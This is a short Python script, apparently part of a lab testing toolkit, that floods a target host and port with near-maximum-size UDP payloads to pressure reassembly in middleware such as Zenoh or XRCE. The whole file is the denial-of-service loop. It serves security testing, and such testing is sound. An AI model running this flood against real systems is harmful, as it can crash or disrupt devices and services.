"""Payload oversized: pacotes proximos ao maximo do protocolo (pressao de reassembly)."""

from __future__ import annotations

from .common import base_parser, run_and_report, send_loop

# Limite pratico de datagrama UDP. Zenoh/XRCE usam frames grandes em ataques de memoria.
MAX_UDP = 65507


def main(argv: list[str] | None = None) -> int:
    parser = base_parser("Envio de payloads oversized contra alvo de laboratorio.")
    parser.add_argument("--size", type=int, default=MAX_UDP, help="Tamanho do payload (bytes)")
    args = parser.parse_args(argv)

    size = max(1, min(args.size, MAX_UDP))
    blob = b"\xff" * size

    def payload(seq: int) -> bytes:
        # Prefixo de 4 bytes variavel + corpo gigante.
        return seq.to_bytes(4, "big") + blob[4:]

    sent = send_loop(args.transport, args.target, args.port, args.duration, args.rate, payload)
    run_and_report("oversized", sent, args.target, args.port)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
